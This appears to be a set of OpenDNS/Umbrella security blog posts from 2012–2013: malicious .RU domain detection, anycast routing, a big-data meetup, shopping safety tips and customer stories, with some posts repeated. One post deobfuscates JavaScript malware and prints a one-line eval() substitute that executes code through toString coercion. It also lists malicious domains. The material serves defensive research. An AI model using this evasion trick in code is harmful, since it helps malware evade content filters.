locations!\nLocations\nDomain\n\n\n867\nlafdamow.ru\n\n\n505\ngirwysca.ru\n\n\n443\nwascadux.ru\n\n\n418\najgijuap.ru\n\n\n374\njilvoqsi.ru\n\n\n326\nenhawcus.ru\n\n\n289\ntaosiram.ru\n\n\n253\nhevlehaw.ru\n\n\n242\nditeqciq.ru\n\n\n200\nvehyfgor.ru\n\n\n196\nzurgovod.ru\n\n\n185\nsepsiqbo.ru\n\n\n147\nnuzejviz.ru\n\n\n145\netujaqhe.ru\n\n\n119\nmarsotrip.ru\n\n\n103\nzazzeqan.ru\n\n\n103\nazvaebyn.ru\nHaving hopped to 92 countries, 665 ASNs, 1486 network prefixes and 2780 IP addresses in 7 days, the lafdamow.ru domain name is an obvious outlier that we quickly blocked as malware. As a researcher, outliers like this are almost impressive in their ability to change and move around so rapidly.\nThe requester’s geographic profile\nOur intuition, confirmed by the co-occurrence matrix above, is that the frequency distribution of countries from which traffic is sent to ccTLD domains is predicable with a good accuracy.\nThe .RU ccTLD, for example, shows this expected distribution for benign sites:\n\nA vast proportion of queries to .RU domains are coming from Russia, followed by Ukraine and US, other countries being almost uniformly distributed.\nHowever, we observe that malicious .RU domains show a totally different distribution of requester countries. They receive few queries from Russia, Ukraine, Belarus and Kazakhstan, and a vast majority of the queries are coming from the US.\n\nWe use the Kolomogorov-Smirnov test to compare these distributions, after discarding the countries presenting a high variance and countries seen in the expected distribution, but not in our observations. In our experiments, the result of this test happens to be a pretty unreliable feature to label a domain as malicious. However, this is an extremely important feature to label a domain as benign, with only 0.02% false positives.\nThe lexical features\nDomains used to serve malicious content don’t need to have any meaningful content. In fact, not having any meaningful content could even be a strategy to avoid being seen by search engines.\nOur intuition is that ccTLDs and languages are tightly coupled, thus domain names from a specific ccTLD show predictable lexical features. A .RU domain is likely to contain a lot of Russian-specific sequence of characters, that are unlikely to occur in a .CN domain. And sequences of characters that don’t match anything we expect in English can be very frequent in Russian.\nFor this reason, we built a training set of .RU domain names known to be benign, from which we computed the unigrams to quadrigrams frequency distribution.\nWe then defined a “DGA score” function, whose output represents how wrong our guess for the next character of a domain name is, considering the 1 to 4 previous characters, based on our reference frequency distribution.\nPseudorandomly-generated domain names are usually easy to distinguish from human-generated, meaningful names. Thus, in the following experiment, we build a set of malicious names known for serving malware, but not part of a botnet leveraging algorithmically-generated names.\nThis DGA score is computed for a distinct set of domain names known to be clean, and for the list of malicious names.\n\nWhile the lexical properties of name is far from being sufficient for classifying a domain as malicious or not, we observe that it is still an significant feature to use.\nThe Umbrella Security Labs is now blocking 80,000,000 malicious, botnet or phishing requests each day. Given the huge variety of malware, it’s clear that there’s no one-size-fits-all model. Our team uses the three models described above to detect ccTLD-specific anomalies. While there is certainly much to gain from the use of these models, we’re relentless in our quest to identify new models and algorithms that can inform us about the likelihood of a domain’s classification.  Those models vary from general to specific, but they’re all contributing to greater protection for our customers.', 'Security Research;Threat Discovery', 'https://umbrella.cisco.com/blog/2013/01/18/the-importance-of-cctld/');

Simply processing the requests is a huge job, but we’re also tasked with ensuring that each of these queries is answered as quickly as possible. One of the technologies that helps us maintain our great availability and speed is called Anycast. In this blog post we’ll explain what Anycast is, how we use it and how it helps us maintain our awesome availability.\nDUPLICATE IP ADDRESSES\nConventional networking wisdom tells us that an IP address should be unique. Two hosts with the same IP address could lead to all kinds of strange and unexpected results, right? While normally this is true, there are scenarios in which multiple hosts with the same IP address can work really well. This is exactly what Anycast is.\nWith Anycast, the same IP address (for example, the OpenDNS nameservers 208.67.222.222 & 208.67.220.220) exists on multiple servers around the world.  OpenDNS currently operates clusters of nameservers at 13 unique locations around the world and soon 6 more European sites, bringing the total to 19 sites, each with numerous DNS resolver instances. All of these DNS servers operate with the same IP addresses which means that there are over a hundred machines with an IP address of 208.67.222.222.\n\nBGP AND PEERING\nSo how does this all work? The answers lies in the protocol that makes routing on the Internet work. BGP, the Border Gateway Protocol, is the routing protocol used on the Internet by all providers today.\nOpenDNS has many direct connections with other providers, which are called BGP peerings. Over each of these peerings we run BGP as a routing protocol and both parties announce what network prefixes can be reached through this connection.\nWhen selecting new data centers we look for locations that enable us to “peer” with many other networks. Having all those direct connections with other networks improves redundancy as it increases the number of available paths to our users and content providers. Best of all, it improves performance because the round trip time (RTT) is reduced.  At OpenDNS we have many direct peerings with a large number of other networks around the world and we continue to add more peerings. To give you an idea, in the last two months alone we’ve added more than 200 new peering sessions.\nSimilar to any other routing protocol, BGP will deliver a packet using the shortest path to a destination.  In the case of BGP the shortest path is determined by looking at the ASPATH. This is a sequence of Autonomous Systems (AS) numbers. Each AS number represents a network or service provider. For example the OpenDNS AS number is 36692.\nWe use BGP to announce the same IP address ranges from all our locations in the world and utilize the Internet routing system to make sure that our users will use the DNS server that is closest to them.\nEXAMPLE\nLet’s look at an example for a user in Miami and assume this user is a customer of a regional Internet Service provider in Florida.  The ISP has a direct peering with OpenDNS and also has connections to two different large (Tier1) transit providers (illustrated as provider A and B in the drawing below).\nIn this scenario, OpenDNS traffic for the user will go to our data center in Miami and is routed over the direct path between the ISP and OpenDNS as we have a direct BGP peering here (Illustrated as the orange line).  Direct connections are preferred as they have a shorter ASPATH, save both parties money and typically have a lower RTT.\n\nThe diagram above describes a typical scenario where we peer with local and regional ISPs and also have two or three transit providers at each site. When looking at this diagram it’s pretty obvious that this setup offers a lot of redundancy (many connections). Should something happen with the peering connection, traffic will fail over to the one of the numerous alternative transit paths.\nShould something happen to OpenDNS’s Miami data center, the routes are automatically withdrawn and BGP will quickly re-route to the closest alternative OpenDNS site.  As routing protocols typically select the route with the shortest path this user will most likely be routed to one of our servers in Dallas or Ashburn.\nLuckily, failing over to a different data center doesn’t happen very often but it’s good to know it will work seamlessly when needed. I should also mention that within each of the data centers we run a number of identical instances of our DNS servers and each instance has the same IP addresses here as well.  So as you can see we use the same Anycast technology within each data center as well and rely on standard routing technologies for load balancing.\nMONITORING AND MANAGEMENT\nUsing Anycast alone would result in some interesting challenges. For example when we need to collect performance and health statistics from each server.  Imagine a simple health check, for example a DNS request to the Anycast address 208.67.222.222. This would only test the DNS server closest to our monitoring servers.  To solve this each DNS server has multiple addresses, a Unicast address for management and monitoring purposes as well as an Anycast address.  This allows us to have detailed performance statistics for each server and helps us with troubleshooting.\nIt’s probably clear now why we decided to use Anycast technology for our services. Anycast allows us to easily scale our service globally by just adding more data centers and servers, all with the same IP address.  We use BGP to achieve load balancing and failover within the data center as well as globally between data centers.\nAll of this works on the network layer and in the case of a failover there is no need for making changes to load balancers, proxy servers, DNS servers, etc.  This makes a failover event totally transparent to OpenDNS users. Because the IP address doesn’t change no changes are required on the client side, no TTL caching issues, etc.\nFinally we have many direct peering connections with other content providers and ISPs to make sure we have the shortest possible routes to our users.  All this results in fast lookups and awesome availability.', 'Security Research;Security Tools', 'https://umbrella.cisco.com/blog/2013/01/10/high-availability-with-anycast-routing/');

So, we wanted to share the presentations here for everyone to enjoy. Below you’ll find summaries of each presentation and a video capturing the evening’s talks.\nVideo of the presentations can be found here: http://youtu.be/AeITUpKD944\nBig Data for Security at OpenDNS\nOpenDNS is currently answering 50 billion DNS queries a day. That’s nearly 3 percent of the world’s total Internet users. The impossible mission of the OpenDNS security research team is to slice and dice these queries in order to discover new threats and new malicious domains as fast as possible.\nOpenDNS researchers use statistical analysis, visualization and machine learning to gain insight, and are complimented by the OpenDNS community-based tagging system that now also includes malware domain tagging. Since a single false positive can have a catastrophic impact for both Umbrella and OpenDNS customers, the team works on numerous algorithms to achieve a very low error rate and eliminate false positives.\nThe team detailed three such algorithms in their presentation:\nSecure Rank – A variation on Google’s Page Rank algorithm that leverages prior knowledge of both malicious and benign domains to assign an initial rank. This algorithm works amazingly well and has quickly discovered thousands of new, highly suspicious domain names for the OpenDNS research team.\nPersonalized Page Rank – Focuses on what happens just before and just after an infection, and at a specific geographical location. The focus here is on finding compromised websites that will eventually host or control malware.\nFast Flux – There’s a specific category of domains known as Fast Flux that take advantage of the fact that the set of IP addresses returned for a domain name is only valid for a limited period of time, over which the domain owner has full control. A botnet operator can leverage this feature to very quickly switch to a different set of hosts in order to serve a malicious payload. This makes it more difficult to block a criminal operation, as any compromised machine can become a host for redirecting Web browsers or serving spam, phishing and malware at any time. In a recent Fast Flux detection experiment, predictions were 99% accurate with zero false positives for 600 true negatives.\nThe team also shared details on the numerous tools, programming languages and libraries they use for processing the wealth of data at their fingertips. The research team uses Hadoop, HBase, Pig, Hive, Java, Ruby, Python, R on a daily basis, and Kafka, Storm, GraphLab and GraphChi are being experimented with. You can learn more about the OpenDNS security research team by following @ThinkUmbrella on Twitter.\nData Mining at Pandora\nThe Pandora research team shared some very impressive numbers: 175 million registered users, 3.8 billion stations and 1.27 billion listening hours per month and counting. But what makes for good data mining? At Pandora, it’s all about discovery, and learning interesting or unexpected facts about your own area of study or system. For example, a few years back the Pandora team discovered a station named, “Christmas Radio” that they had never created. However, the system had self-adapted to actually play holiday music.\nFor data mining, Pandora uses Hive, R, Matlab, D3.js and the Google Charts API. For data storage, they recently shifted from Postgres to Hadoop, observing that until you have huge amount of data, Postgres works just fine.\nIt has been twelve years since Pandora first invented the Music Genome Project, which compresses a song as a sequence of characteristics, or “genes”. But, this exciting and unique project is still being worked on today by 25 musicians.

Pure cloud security vendors, on the other hand, are primed to both secure users for the new reality of how work gets done (outside the office, at coffee shops, in airports, in hotel lobbies), and adapt our businesses at a rate that ensures security actually stays ahead of threats. For example, our new line of security services called Umbrella is 100% cloud-delivered, so we’re able to focus on service, innovation and cutting-edge security research instead of logistics.\nIf you’d like to learn more, you can join the upcoming webcast, The Evolution of Security from Appliance to the Cloud. OpenDNS CEO David Ulevitch will be discussing the details of how cloud-delivered security solutions are better equipped than appliances to protect against today’s threats. Or, you can see for yourself what the cloud can do for your network security with a free trial of Umbrella, which offers cloud-delivered malware protection for all devices and users, on or off the network.', 'Announcements;Umbrella', 'https://umbrella.cisco.com/blog/2012/12/18/blue-coat-crossbeam-why-doubling-down-on-hardware-wont-make-users-more-secure/');

After filling up on plenty of beer and pizza, attendees made their way upstairs to enjoy presentations from the OpenDNS security research team and Pandora’s data mining team. Although the meetup group is local to San Francisco, Big Data has begun to dominate research strategies across entire industries, all over the world. So, we wanted to share the presentations here for everyone to enjoy. Below you’ll find summaries of each presentation and a video capturing the evening’s talks.\nVideo of the presentations can be found here:\nBig Data for Security at OpenDNS\nOpenDNS is currently answering 50 billion DNS queries a day. That’s nearly 3 percent of the world’s total Internet users. The impossible mission of the OpenDNS security research team is to slice and dice these queries in order to discover new threats and new malicious domains as fast as possible.\nOpenDNS researchers use statistical analysis, visualization and machine learning to gain insight, and are complimented by the OpenDNS community-based tagging system that now also includes malware domain tagging. Since a single false positive can have a catastrophic impact for both Umbrella and OpenDNS customers, the team works on numerous algorithms to achieve a very low error rate and eliminate false positives.\nThe team detailed three such algorithms in their presentation:\nSecure Rank – A variation on Google’s Page Rank algorithm that leverages prior knowledge of both malicious and benign domains to assign an initial rank. This algorithm works amazingly well and has quickly discovered thousands of new, highly suspicious domain names for the OpenDNS research team.\nPersonalized Page Rank – Focuses on what happens just before and just after an infection, and at a specific geographical location. The focus here is on finding compromised websites that will eventually host or control malware.\nFast Flux – There’s a specific category of domains known as Fast Flux that take advantage of the fact that the set of IP addresses returned for a domain name is only valid for a limited period of time, over which the domain owner has full control. A botnet operator can leverage this feature to very quickly switch to a different set of hosts in order to serve a malicious payload. This makes it more difficult to block a criminal operation, as any compromised machine can become a host for redirecting Web browsers or serving spam, phishing and malware at any time. In a recent Fast Flux detection experiment, predictions were 99% accurate with zero false positives for 600 true negatives.\nThe team also shared details on the numerous tools, programming languages and libraries they use for processing the wealth of data at their fingertips. The research team uses Hadoop, HBase, Pig, Hive, Java, Ruby, Python, R on a daily basis, and Kafka, Storm, GraphLab and GraphChi are being experimented with. You can learn more about the OpenDNS security research team by following @ThinkUmbrella on Twitter.\nData Mining at Pandora\nThe Pandora research team shared some very impressive numbers: 175 million registered users, 3.8 billion stations and 1.27 billion listening hours per month and counting. But what makes for good data mining? At Pandora, it’s all about discovery, and learning interesting or unexpected facts about your own area of study or system. For example, a few years back the Pandora team discovered a station named, “Christmas Radio” that they had never created. However, the system had self-adapted to actually play holiday music.\nFor data mining, Pandora uses Hive, R, Matlab, D3.js and the Google Charts API. For data storage, they recently shifted from Postgres to Hadoop, observing that until you have huge amount of data, Postgres works just fine.\nIt has been twelve years since Pandora first invented the Music Genome Project, which compresses a song as a sequence of characteristics, or “genes”. But, this exciting and unique project is still being worked on today by 25 musicians. Sounds like there’s lots more discovery to come.\nImages from the night:', 'Labs Research', 'https://umbrella.cisco.com/blog/2012/12/17/exploring-big-data-with-the-opendns-and-pandora-research-teams/');

Early reports indicate that online shopping rose 17 percent this year, with consumers spending $1.46 billion in online purchases on Monday alone. As we know by now, whenever there’s a dramatic rise in online spending, there will be a corresponding spike in cyber crime. Whether you’re looking to protect yourself while shopping online this season, or ensure that your network is safe as employees scout the best online deals, we’ve got you covered. We asked our friend and Internet security expert Jerry Gamblin to share his top 5 tips for safe online shopping this holiday season.\nJerry Gamblin‘s Top Five Tips to Stay Safe Online this Holiday Shopping Season:\nUpdate your security software and other applications. Keeping the software on your system up-to-date is an important part of keeping your system safe and secure. Many security experts recommend running Secunia PSI on PCs. It automatically finds all of you outdated software and updates it for you.\nUse a credit card instead of a debit card. If you have a problem with a purchase or your card number gets stolen, your debit card is more vulnerable because it is linked to your bank account. Don’t spend the time you could be watching A Christmas Story fighting with your bank to get money back in your account.\nIf it seems too good to be true, it’s probably a phishing email. Watch out for “special deal” emails you receive that appear to be from legitimate retailers. Look for poor grammar or misspellings in the email and URLs that take you to places other than the retailer’s website. If in doubt go directly to the retailer’s website and check for the deal there. (Hint: you can take OpenDNS’s phishing quiz to test your skills)\nUse OpenDNS. Using OpenDNS is a great way to make sure you don’t end up on a site that might steal your passwords or credit card number. The version for home users automatically protects against phishing or other sites you choose to block. OpenDNS also offers Umbrella, which protects business networks and users against malware and botnets.\nUse a different password for every website.This could be the most important thing  you  do to keep safe online, but it isn’t easy. Websites that keep user data are prime targets for hackers, so the best way to limit the damage done to you is by never having the same password on two websites. If you can’t remember all the passwords, use a service like LastPass to help. When hackers hack a website and find a usernames and passwords the first thing they do is try to on as many popular websites as possible. If your passwords don’t match they will move along and try the next one on the list.\nOf course, you can always try holiday shopping the old fashioned way and go out and hit the stores!\nWhat are your tips for staying safe this holiday season?

Given my background in research on graph algorithms, I was on the lookout for conferences about graphs in the city. My curiosity was rewarded when I discovered that GraphConnect was taking place in San Francisco at the Hyatt Regency on November 5-6. I registered immediately and counted down the days until the event.\n\nThe study of graphs has been around for over a century as a branch of discrete mathematics. With the advent of computers about 60 years ago, it became an important part of computer science. In the past decade, companies like Google, Facebook and Twitter respectively popularized the concepts of link/knowledge graph, social graph and interest graph. However the technology of graph databases, which was the topic of the conference, is still a nascent phenomena. Relational databases have been the de-facto technology to store and manipulate data in businesses. That is, until the NOSQL movement took the world by storm. Graph databases are the newcomer in this line of non-relational data stores, as graphs are both a natural and powerful way to model a plethora of problems we face in business and research.\nThe conference was successful in covering topics both technical and social. I noticed the presence of both big names like Twitter, Intuit, and Fujitsu and emerging startups such as FiftyThree and Squidoo that are embarking on the graph databases movement. It was also an opportunity for me to meet new people and share the awesome work we do and technology we deliver here at OpenDNS. In fact, the organizers gave all attendees badges with RFID tags and we were given the fun homework of approaching and getting to know as many people as possible as the tags will record our new connections.\nMy first favorite talk was the keynote by Professor James Fowler about “The Power of the Social Graph”. One of the interesting revelations from Dr. Fowler’s research is that smoking, obesity, and happiness spread within social networks between friends that are tightly related, since friends influence each other through emotions and behaviors. He also pointed out that these influence relations are not necessarily symmetrical and they differ based on gender. The other interesting discovery Dr. Fowler discussed is that genes affect voting behavior. The second talk I liked was titled “Intuit Payment Graph: A network built on payment transactions of customers and vendors” by G. Pillai. In this talk, Intuit presented a prototype of their Payment Graph whose data model is represented using Neo4j. Nodes are businesses or individuals and the links represent the transaction volumes and frequencies. The size of the model is a few tens of millions of nodes and links, and a few hundred millions of properties. They plan to use this system to connect consumers with small businesses, to create small business micro-communities, and to offer their customers referrals and recommendations. The next talk that caught my interest was “FluxGraph: A Time-machine for your graphs“ by D. Suvee. The talk discussed how graph databases can be augmented with the temporal notion so that we can travel the graph through time. Suvee discussed the useful application in retrospective medical research and presented the application they developed at Janssen Pharmaceuticals.\nOverall, this conference was very useful as it gave me ideas on potential applications in our security research work at OpenDNS such as recommendations and temporal graph databases. I look forward to putting these ideas into practice and sharing the results with you soon.\nLet’s not forget to mention that the organization of the conference, as well as lunch and dinner, were excellent, and the conference after party was so much fun :)!', 'Labs Research', 'https://umbrella.cisco.com/blog/2012/11/14/graphconnect-conference/');

The first thing a malware author does before releasing malicious code is to check that popular antiviruses and content filters are not going to detect it. Evasion techniques are numerous and constantly evolving, and Web malware is especially hard to detect. Web browsers have become extremely complex, and with that complexity comes a lot of attack vectors, and a lot of possible obfuscation techniques.\nEarly on, Web filters simply scanned Web content for malicious links. As expected, malware authors quickly worked around these, by exploiting the fact that different parsers can interpret the same content in a totally different way.\nThese days, Javascript is by far the most common obfuscation vector for Web-based malware, and with good reason. Static analysis of Javascript code is possible, but it can be intentionally made to require a lot of non-parallelizable CPU cycles. More importantly, Javascript is tightly coupled with other components when in a Web browser. Adding a dependency on the DOM, on shared data, or on external resources is enough to make static analysis insufficient. Moreover, testing the code in a sandbox is an expensive and non-deterministic operation. This is why Web malware code is almost always served obfuscated.\nSo, should obfuscated code systematically be flagged as suspicious by content filters? Unfortunately, distinguishing legitimate web application code from malware code is far from trivial.\nModern web applications typically use compilers, compressors, DOM attributes, lazy/deferred loading and optimization techniques that make it difficult to distinguish obfuscated from unobfuscated code without raising an excessive number of false positives.\nOpenDNS use a different approach. We are analyzing billion of DNS queries every day in order to detect suspicious behavior. This allows us to spot domains serving malware very quickly. Then, our research team analyzes the code itself, in order to proactively block other domain names the malware is going to spread to.\nLet’s take a look at some real-world, obfuscated malware code we stumbled upon.\n\nAs expected, this is barely readable. However, it’s easy to see that a lot of code is just a distraction: extra parenthesis and numbers expressed in different ways are all around, but may not be actually useful.\nThe first thing we did was to filter this code through a Javascript compressor, namely UglifyJS.\nModern Javascript compressors do more transformations than just shortening functions and variable names. In particular, they can optimize the control flow, resolve constant expressions and remove dead code. This is a perfect fit for removing the noise from obfuscated code.\nCompressing the code, and reformatting it makes it easier to understand how this code works.\n\nThere is a setup phase where variables are constructed by combining a lot previously defined variables initially containing just a few characters. At at some point, this forms code that is ready to be executed. And we want to trace the code from here.\nIn order to do so, we copied the code to a sandbox, and wrapped it in an object:\n\nJavascript has a notion of “scopes”: a block of code is evaluated in a specific scope, and when a symbol has to be resolved, the current scope is searched first. If no match is found, the parent scope is then scanned, and the process keeps bubbling up to the root scope.\nRunning the malicious code in a dedicated scope makes it easy to override properties and functions in order to observe its behavior.\nIn this context, the code fails because “eval” hasn’t been defined, whereas it would have been if executed in the global (window) scope:\n\nWe learn that:\neval() is being used to run code.\neval() has been evaluated in the current context (presumably using an explicit reference to “this”), not in the global context.\nThus, we can easily override it in order to check what code is evaluated, and drop to the debugger whenever we find something that looks interesting to trace. This can also be used in order to simulate different web browsers.\nThere are numerous ways to load code from a remote server and to replace the current page with third-party content: image+canvas, inserting script tags, loading external stylesheets, XHR, frames…\nBut most of the functions required to do so can be overridden, including DOM manipulation functions.\nAs a starting point, we are going to override XMLHttpRequest() and eval().\n\nThis let us see what dynamically generated code is being evaluated, and what XHR queries are attempted.\n\nIt’s interesting to see that XHR requests are actually used to detect and work around debuggers (Firebug) and deobfuscation tools. Also note that “GE” is used instead of “GET”. This works fine in all major browser, yet this is something that content filters may not be aware of.\nRunning the code after these two XHR requests makes the browser immediately load a different page hosting different malicious code.\nSince we diverted eval() calls, something else must have been used in order to achieve this result.\nLet’s find out what. For starters, we can track the global scope for variables containing something which is likely to be related to an external resource, like “http” or “location”. A simple piece of code that we can run manually or as a watched expression can do the trick:\n\nThe “MxG” variable matches, and contains an obvious reference to malicious third-party content. We now have to track any function calls involving this variable or something composed with its content.\n\nBut there are no more XHR calls. No DOM manipulation. No more eval() calls. How does this code get executed?\nUsing a debugger, we can keep tracing the code. It can be reconstructed by replacing variables with their content.\nHere is the reconstructed, unobfuscated, commented code:\nAs we can see, it’s using a combination of two interesting tricks in order to achieve the same result as eval() without actually using it.\nThe constructor of a Javascript function happens to be another function. And that function has the ability to construct a function out of a string.\nAnd Javascript type coercion can leverage conversion functions. In particular, when a non-string object has to become a string, the toString() function is applied to the object itself.\nThe dynamic nature of Javascript allows overriding this toString() method. In this case, the code abuses this feature in order to evaluate the previously created function when a number has to be converted to a string, effectively achieving code execution.\neval() can thus be rewritten as:\nevil=function(c,x){x={toString:\'\'.constructor.constructor(c)};x+\'\'}\n\nIf you’ve made it this far into the post you can see that it’s no longer enough to simply look for specific patterns in the code. It takes a keen eye, and behavioral analysis to detect malware given the advent of such sophisticated obfuscation techniques.

I’ll be talking about the changing threat landscape in a future blog post, but today I want to share with you why we’re so focused on embracing the changing way that work gets done.\nWe see the approach other security companies are taking. They think your corporation is like a castle, simple to defend. They tell you to build strong (fire) walls around the office, dig a moat, fill it with alligators, and barricade your users inside.  They think that if you just have one or two entrances to the castle, you can drop their appliances at those chokepoints and get full visibility into your network traffic.   I don’t know about them, but I don’t work in a castle.  And from talking with our thousands of customers, none of our customers do either.\nI have a laptop and an iPhone. I work at the office, but I also work from home, at the airport, and even at coffee shops. In fact, I work wherever work needs to get done. It’s 2012, most of us work that way.  But other security companies don’t want to recognize that reality.  Well, we’re recognizing it.\nNo other company today seems to welcome the idea that security should be as ubiquitous and broad as connectivity is. Work is very much a thing you do, and not a place you go. That’s not going to change, so security needs to adapt in order to be effective and even act as an enabler to productivity.\nAllow me to share an analogy that we’ve been using around the OpenDNS offices lately. When you get in your car and drive to work, the first thing you do is put on your seatbelt. If you have kids, you double-check that they’re buckled up before you pull out of the driveway to take them to school.  But you always wear your seatbelt, not just when you’re driving to work or to school. You wear it anywhere you drive. That’s because you understand that whenever there’s risk, it’s important to add safeguards. So why isn’t Internet security treated the same way?\nHaving security only when you’re in the office makes absolutely no sense. Security needs to be contextual – you need the right policy for the right person on the right device in the right place at the right time.  Security today doesn’t deliver on that need.  With Umbrella, we’re going to tackle that problem.\nUmbrella is security that will follow your users on their roaming laptops and work seamlessly on their mobile devices. It will enable them to be their most productive, no matter where they are or what device they’re working on. And unlike today’s solutions that look at the end user only through the lens of the network admin, we’d like to see security solutions that offer a benefit to the people who are being asked to use them.\nWe’re in early stages, and have a long way to go to fulfill that vision.  But, we’re well on our way.  If you’d like to be the first to find out more about how Umbrella will secure the nomadic workforce you can register for updates on our launch page or plan to join our webcast in late November.', 'Announcements;Umbrella', 'https://umbrella.cisco.com/blog/2012/10/25/umbrella-is-ubiquitous-security-for-ubiquitous-connectivity/');

The first thing a malware author does before releasing malicious code is to check that popular antiviruses and content filters are not going to detect it. Evasion techniques are numerous and constantly evolving, and Web malware is especially hard to detect. Web browsers have become extremely complex, and with that complexity comes a lot of attack vectors, and a lot of possible obfuscation techniques.\nEarly on, Web filters simply scanned Web content for malicious links. As expected, malware authors quickly worked around these, by exploiting the fact that different parsers can interpret the same content in a totally different way.\nThese days, Javascript is by far the most common obfuscation vector for Web-based malware, and with good reason. Static analysis of Javascript code is possible, but it can be intentionally made to require a lot of non-parallelizable CPU cycles. More importantly, Javascript is tightly coupled with other components when in a Web browser. Adding a dependency on the DOM, on shared data, or on external resources is enough to make static analysis insufficient. Moreover, testing the code in a sandbox is an expensive and non-deterministic operation. This is why Web malware code is almost always served obfuscated.\nSo, should obfuscated code systematically be flagged as suspicious by content filters? Unfortunately, distinguishing legitimate web application code from malware code is far from trivial.\nModern web applications typically use compilers, compressors, DOM attributes, lazy/deferred loading and optimization techniques that make it difficult to distinguish obfuscated from unobfuscated code without raising an excessive number of false positives.\nOpenDNS use a different approach.

But technology and how we use it advances quickly, and we know security solutions need to adapt, too.\nOver the last year we’ve spent a lot of time talking to customers, partners and industry colleagues about a number of topics: The consumerization of IT, the prevalence of smartphones used for work, the shift to cloud-based applications, and an increasingly-hostile threat landscape.\nWhile much has been written about these topics in their present state, we prefer to look towards the future. In thinking about these themes we discovered that the very nature of how work gets done is changing rapidly. The security solutions available today to help companies securely and safely adapt to new ways of working are sorely lacking. As it turns out, good solutions don’t exist.\nToday’s worker is increasingly nomadic: Working from home, Starbucks, or on the road. They use an increasing number of devices, and those devices are for both work and personal use. Moreover, many of the fundamental security best practices of the last twenty years, like centrally managed access control, encrypted communication channels, and intrusion detection were not designed for a highly-distributed workforce, accessing cloud services, using myriad devices. In many cases, the security practitioners weren’t even a part of the conversations as more avant-garde companies attempted to accomodate a shift to the cloud and smartphones.\nSo we put our heads down and got to work.\nNext month, we will be launching a powerful new service, built atop the rock-solid foundations and infrastructure OpenDNS has been creating since 2006.

Planet Beauty joins several popular retail organizations, including Eastern Mountain Sports, E-Z Rent-A-Car, Ridenow Powersports, and Lush, that have also selected OpenDNS Enterprise for security. So, why are retail chains flocking to OpenDNS in droves? Retail chains select OpenDNS for a variety of reasons: Keeping malware off the corporate network to ensure customer data is protected, ensuring acceptable use policies are enforced for the staff, and providing family-friendly guest Wi-Fi for store visitors are among the most popular. Today, let’s take a closer look at Planet Beauty’s experience.\nPlanet Beauty’s IT team was looking to solve two main issues. First, the team needed a way to easily enforce an acceptable use policy across all 32 locations without deploying an appliance to each. Second, the team wanted an additional layer of security on its corporate network that would allow it to proactively block access to known malicious sites and eliminate botnet communications.\nWe talked to Leo Salazar, IT assistant for Planet Beauty, to find out more. He told us, “Our retail stores handle private customer information, so Internet security is a top priority. In order to ensure that sensitive customer data is kept private, it’s essential that our malware protection program is airtight.”\nAfter evaluating Norton, SonicWALL and DNSAdvantage solutions, the Planet Beauty IT team settled on OpenDNS Enterprise because the cloud-based service can proactively prevent malware downloads by blocking access to known malicious sites. This ensures that the Planet Beauty IT team will spend less time hunting down and cleaning up malware infections after the network has already been compromised. Additionally, Planet Beauty found OpenDNS Enterprise to be the ideal Web filtering solution for its individual retail locations because there is no appliance to deploy and all sites can be managed remotely.\nAs Leo explains, “OpenDNS Enterprise allowed us to quickly and easily deploy Internet security and Web filtering services to 32 locations, and we get the same features offered by appliances without the big headache.” Can’t beat that!\nGet to know all the customers that select OpenDNS Enterprise for security and Web filtering, and give us a shout if you’d like to share your story on the blog.', 'Field Reports', 'https://umbrella.cisco.com/blog/2012/09/19/field-reports-why-retail-chains-love-opendns/');

Here’s a quick refresher course on how anycast routing technology works: Of our fourteen global data centers, anycast routing means we can promise you that no matter where you are, we’ll always be routing your requests to the server location topologically nearest you. It also means that should a server be taken offline for any reason, you’ll automatically be routed to the next closest location.\nAnd in case you missed it, we’re now serving 50 million users around the world and 40 billion DNS requests each day. You can expect to see us continue optimizing our current data centers to handle additonal capacity and adding even more locations to our impressive global footprint in the coming months and years.\nWhere would you like to see the next OpenDNS data center?

It’s also about creating an environment where every individual across the organization — sales, marketing, engineering, operations, support and finance — will consistently strive to do better, achieve more, inspire others and help the company increase velocity. We make no exception for our interns, who are smart, talented and passionate people eager to make the Internet better. And we usually end up learning a thing or two from them in the process.   Here’s one star intern’s take on her summer with us.\nThree years ago, when I told my parents that I wanted to get my degree in International Relations, they were less than enthused.  “International Relations?” they questioned; “Does it get any more broad than that? What exactly do you plan to do with that degree?”  As parents who love me and care about my future success (and pay the hefty Stanford University bill each year), they had every right to demand these answers; but as a freshman thoroughly enjoying college life and all it had to offer, I didn’t have the answers they were seeking.  I really loved my classes, and I knew that the International Relations (IR) major was the right choice for me, but with such a broad field of study I found myself with absolutely no idea what I would do post-graduation.  I’m not pre-med or an engineer––the sight of blood makes me dizzy–– and I can’t program computers for the life of me. And the mere thought of law school gives me a headache.  What does someone like me do after school?\nFast-forward to March 2012.  I was a junior studying abroad in Madrid, Spain, and for all intents and purposes, I was having the time of my life.  It was during my 10-week stint in Europe that I dove head first into the internship search, hoping that something ––despite the fact that I still wasn’t sure what kind of work I wanted to do –– would eventually catch my eye.  Early on in my search, I stumbled upon a job listing on the Stanford Career Center website posted by a company I had never heard of––OpenDNS.  The listing that caught my eye was for a marketing and PR internship, and when I explored the company’s website and publications, I discovered an organization comprised of smart, passionate people who loved to work hard––and play hard.  Immediately, I knew that I wanted to be a part of OpenDNS, but as an IR major, I didn’t think a tech company would have room for me.  Despite my hesitations, I submitted my resume, and three Skype interviews and a lunch date later, I was an OpenDNS employee.  I was thrilled and proud, but I was also nervous.  Where did I fit into a tech company?  Would my “soft” skill-set be needed or used at all?  Would I spend all summer getting coffee and stamping envelopes?\nToday, as I sit and reflect on the past 5 months with OpenDNS, I can hardly imagine a time when I ever felt uncertain about my role at this company.  For the record, I did stamp a few envelopes, but my internship has been so much more than that.  From day one, OpenDNS has made me a part of the team.  I was held to the same standards of excellence that were demanded of everyone else, and was given responsibilities equal to those of full-time employees.  I was entrusted with communicating directly with OpenDNS customers about their experience with our service, writing press releases and blog posts, overseeing various customer outreach programs, and managing and organizing content for the company’s Facebook page.  That’s a lot of responsibility for an intern, and I couldn’t have been happier about it.\nThroughout my time at OpenDNS, I have never felt overlooked or written-off because of my status as an intern.  Rather, I’ve felt as if my ideas and suggestions are welcomed and always given serious consideration.  Additionally, because of the relatively flat corporate structure of OpenDNS (and many other start-ups) I’ve had the rare opportunity to get to know almost everyone in the company, including the CEO.  The office environment here at OpenDNS fosters teamwork, creativity, and innovation, and I feel lucky to have worked so closely with such smart, talented people.\nDespite the all of the wonderful things about working at OpenDNS––and trust me, the list could go on and on; did I mention the catered lunches, trips to Giants baseball games, office happy hours, and fully stocked kitchen?––my single favorite part about working here has been what I’ve 